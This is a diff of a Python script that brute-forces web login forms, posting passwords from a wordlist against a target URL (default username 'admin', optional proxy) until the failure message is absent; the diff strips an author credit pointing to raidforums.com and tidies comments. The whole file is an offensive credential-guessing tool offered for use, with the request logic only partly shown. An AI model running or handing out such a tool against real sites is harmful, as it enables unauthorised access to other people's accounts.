@@ -1,7 +1,4 @@
 #!/usr/bin/python3
-###################################################
-#  Made by https://raidforums.com/User-ch0colate  #
-###################################################
 
 try:
     import requests, json, argparse, sys
@@ -15,15 +12,15 @@ except Exception:
     print()
     exit(1)
 
-###################################EDIT THIS###################################
-user_parameter = "user"  # Put here the user request parameter
-pass_parameter = "pass"  # Put here the password request parameter
-submit_parameter1 = "submit"  # Put here the submit request parameter
-submit_parameter2 = "Login"  # Put here the submit request parameter
-fail_message = "Error"
+################################### EDIT ME ###################################
+user_parameter = "user"			# User parameter for the request
+pass_parameter = "pass"			# Password parameter for the request
+submit_parameter1 = "submit"	# Submit parameter for the request
+submit_parameter2 = "Login"		# Submit parameter 2 for the request
+fail_message = "Error"			# String that appears in the website when failing the login
 ###############################################################################
 
-# Def the text types
+# Functions for text with color
 def success_text(text, text2):
     print()
     print(" %s%s%s[+] %s >> %s%s" % (Style.RESET_ALL, Style.BRIGHT, Fore.GREEN, text, text2, Style.RESET_ALL))
@@ -35,8 +32,10 @@ def error_text(text):
 def invalid(text):
     sys.stdout.flush()  # Bad passwords on a single line
     sys.stdout.write('\r'+' [!] Bad password: ' + text)
+	
 #--------------------------------------------------------------------------------
-# Arguments
+# Arguments for argparse
+
 parser = argparse.ArgumentParser()
 parser.add_argument('-t', '--target', help="Put here your target (http / https required)", required=True)
 parser.add_argument('-u', '--username', default="admin", help="Put here the username you want to bruteforce (optional)")
@@ -51,8 +50,10 @@ if args.target is not None and "http" not in args.target:
 elif (args.wordlist is not None) and (".txt" not in args.wordlist):
     error_text("Error. Wordlist must be in txt format.")
     exit(1)
+	
 #--------------------------------------------------------------------------------
 # Check if the proxy is enabled
+
 if args.proxy:
 	proxies = ""
 elif not args.proxy:
@@ -60,8 +61,10 @@ elif not args.proxy:
 else:
 	error_text(" [!] Error. Invalid proxy. Exiting...")
 	exit(1)
+	
 #--------------------------------------------------------------------------------
 # Send the request
+
 with open(args.wordlist, "r") as read_pass_file:  # Read the file
     for line in read_pass_file:  # Read each line
         password = line.strip()
@@ -72,4 +75,5 @@ with open(args.wordlist, "r") as read_pass_file:  # Read the file
             break
         else:
             invalid(str(password))
+			
 exit(1)
